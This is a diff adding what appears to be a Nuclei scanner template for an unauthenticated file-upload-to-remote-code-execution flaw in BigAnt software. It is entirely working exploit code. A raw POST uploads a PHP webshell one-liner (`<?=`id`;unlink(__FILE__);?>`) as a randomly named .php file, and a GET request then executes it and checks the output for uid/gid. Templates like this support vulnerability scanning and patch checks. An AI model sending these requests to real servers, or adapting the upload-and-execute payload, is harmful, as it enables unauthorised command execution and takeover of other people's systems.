@@ -1,0 +1,57 @@
+id: BigAnt-upload_file-uploadToRce
+
+info:
+  name: BigAnt-upload_file-uploadToRce
+  author: iSee857
+  severity: critical
+  description: |
+    BigAnt-upload_file-uploadToRce
+  tags: bigant
+variables:
+  random_filename: "{{rand_base(5)}}"
+
+http:
+  - id: upload-file
+    raw:
+      - |
+        POST /api/dispersedAddin/upload_file.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: PHPSESSID=m905cb6sucrf6i6munki07bc5c
+        Upgrade-Insecure-Requests: 1
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file_info"
+
+        [{"file_path":"{{random_filename}}.php"}]
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="1.txt"
+
+        <?=`id`;unlink(__FILE__);?>
+        ------WebKitFormBoundary--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: execute-file
+    raw:
+      - |
+        GET /{{random_filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - "uid=.*? gid=.*?"
+        part: body
